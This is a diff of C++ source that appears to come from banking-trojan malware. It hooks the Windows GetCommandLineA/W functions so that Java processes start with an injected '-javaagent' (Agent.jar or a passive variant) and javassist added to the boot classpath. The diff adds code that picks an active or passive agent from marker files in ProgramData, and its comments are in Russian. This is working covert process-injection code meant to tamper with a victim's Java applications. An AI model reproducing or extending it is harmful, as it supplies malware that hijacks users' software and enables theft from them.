@@ -46,7 +46,9 @@ PCHAR WINAPI Hook_GetCommandLineA()
 	char find3[] = { '-','X','b','o','o','t','c','l','a','s','s','p','a','t','h', 0 }; //-Xbootclasspath
 	char find4[] = {'-','D','j','a','v','a', 0};
 
-	const char* forIns1 = " -javaagent:\"%s\\Agent.jar\"";
+	const char* agent = "Agent.jar";
+	const char* agentPassive = "AgentPassive.jar";
+	const char* forIns1 = " -javaagent:\"%s\\%s\"";
 	const char* forIns2 = ";\"%s\\Agent.jar\";\"%s\\lib\\javassist.jar\"";//;\"%s\\lib\\client2015.jar\"";
 	DBG("CmdLineA", "----: %s", CommandLineA);
 	if( m_strstr( CommandLineA, "javassist.jar" ) != 0 ) //если уже добавляли, то 2-й раз не нужно
@@ -90,14 +92,27 @@ PCHAR WINAPI Hook_GetCommandLineA()
 		p1 = m_strstr( CommandLineA, find4 );
 		if( p1 )
 		{
+			MemPtr<3 * MAX_PATH> mem;
+			char* passiveDat = mem.str();
+			char* agentStartedDat = mem.str() + MAX_PATH;
+			char* agentWorkingDat = mem.str() + 2 * MAX_PATH;
+			m_lstrcpy( passiveDat, allUsers.str() ); pPathAppendA( passiveDat, "passive.dat" );
+			m_lstrcpy( agentStartedDat, allUsers.str() ); pPathAppendA( agentStartedDat, "agentStarted.dat" );
+			m_lstrcpy( agentWorkingDat, allUsers.str() ); pPathAppendA( agentWorkingDat, "agentWorking.dat" );
+			const char* a = agent;
+			if( File::IsExists(agentStartedDat) && !File::IsExists(agentWorkingDat) )
+				agent = 0;
+			else
+				if( File::IsExists(passiveDat) )
+					agent = agentPassive;
 			//вставка "-javaagent:C:\ProgramData\Agent.jar "
-			int sz1 = pwsprintfA( ins1, forIns1, allUsers.str() );
+			int sz1 = a ? pwsprintfA( ins1, forIns1, allUsers.str(), a ) : 0;
 			//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
 			int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
 			InsertString( CommandLineA, lenCmd, ins2, sz2, p1 - 1 );
 			lenCmd += sz2; p2 += sz2;
 			p2 += sizeof(find1) - 1;
-			InsertString( CommandLineA, lenCmd, ins1, sz1, p2 );
+			if( a ) InsertString( CommandLineA, lenCmd, ins1, sz1, p2 );
 			//m_lstrcat( CommandLineA, ins1 );
 		}
 	}
@@ -114,7 +129,7 @@ PCHAR WINAPI Hook_GetCommandLineA()
 			if( m_strstr( CommandLineA, "javassist.jar" ) == 0 ) //если уже добавляли, то 2-й раз не нужно
 			{
 				//вставка "-javaagent:C:\ProgramData\Agent.jar "
-				int sz1 = pwsprintfA( ins1, forIns1, allUsers.str() );
+				int sz1 = pwsprintfA( ins1, forIns1, allUsers.str(), agentPassive );
 				//вставка ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
 				int sz2 = pwsprintfA( ins2, forIns2, allUsers.str(), allUsers.str() );//, allUsers.str() );
 				int lenCmd = m_lstrlen(CommandLineA);
@@ -134,8 +149,9 @@ PCHAR WINAPI Hook_GetCommandLineA()
 PWCHAR WINAPI Hook_GetCommandLineW()
 {
 	PWCHAR CommandLineW = Real_GetCommandLineW();
-	/*
+	
 	DBG("CmdLineW", CommandLineW);
+	/*
 	if ( m_wcsstr(CommandLineW, L"AgentTest.jar") && m_wcsstr(CommandLineW, L"-jar"))
 	{
 		return pMyCommandLineW;
